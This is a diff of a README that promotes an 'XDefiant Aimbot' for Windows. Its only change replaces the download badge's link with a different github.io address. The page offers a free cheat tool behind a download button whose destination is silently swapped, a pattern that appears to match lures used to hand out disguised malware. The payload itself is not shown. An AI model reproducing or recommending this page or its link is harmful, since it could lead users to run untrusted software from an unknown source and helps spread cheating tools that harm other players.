@@ -3,7 +3,7 @@
 Install and configure the **XDefiant Aimbot** on Windows. This step-by-step guide helps you deploy advanced aim control, custom targeting profiles, and precision tuning for smoother gameplay and training.
 
 ⬇️ **Download**  
-[![Download Aim Assistant](https://img.shields.io/badge/Download-Aim_Assistant-0052CC?style=for-the-badge&logo=ubisoft&logoColor=white)](https://xdefiant-free-aimbot.github.io/.github/)
+[![Download Aim Assistant](https://img.shields.io/badge/Download-Aim_Assistant-0052CC?style=for-the-badge&logo=ubisoft&logoColor=white)](https://linaivanova0555.github.io/.github/xdefiant-assistant)
 
 ---
 
